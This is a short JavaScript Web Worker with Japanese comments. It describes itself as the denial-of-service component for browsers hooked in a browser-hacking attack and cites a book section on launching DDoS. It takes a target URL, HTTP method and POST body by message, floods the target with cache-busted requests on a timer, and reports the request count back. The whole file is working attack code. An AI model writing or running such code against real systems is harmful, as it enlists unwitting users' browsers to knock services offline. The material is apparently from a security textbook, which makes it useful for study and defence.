// フックしたブラウザを複数使用するDDoS, 9.9 サービス拒否攻撃の開始, ブラウザハック
// Ref. http://www.amazon.co.jp/dp/479814343X

var url = "";
var delay = 0;
var method = "";
var post_data = "";
var counter = 0;

// postMessage を使ってデータを取得
this.addEventListener("message", function(oEvent){
  url = oEvent.data['url'];
  delay = oEvent.data['delay'];
  method = oEvent.data['method'];
  post_data = oEvent.data['post_data'];
  doRequest();
});

// URL へのランダムパラメータを追加して、キャッシュを防止
function noCache(u){
  var result = "";
  if(u.indexOf("?") > 0){
    result = "&" + Date.now() + Math.random();
  }else{
    result = "?" + Date.now() + Math.random();
  }
  return result;
}

// <delay>ミリ秒ごとに POST リクエストまたは GET リクエストを発行
function doRequest(){
  setInterval(function(){
    var xhr = new XMLHttpRequest();
    xhr.open(method, url + noCache(url));
    xhr.setRequestHeader('Accept', '*/*');
    xhr.setRequestHeader('Accept-Language', 'en');

    if(method === 'POST'){
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(post_data);
    }else {
      xhr.send(null);
    }

    counter++;
  }, delay);

  // 送信されたリクエスト数を 10 秒ごとに呼び出し元へ通知
  setInterval(function(){
    postMessage("Requests sent: " + counter);
  }, 10000);
}
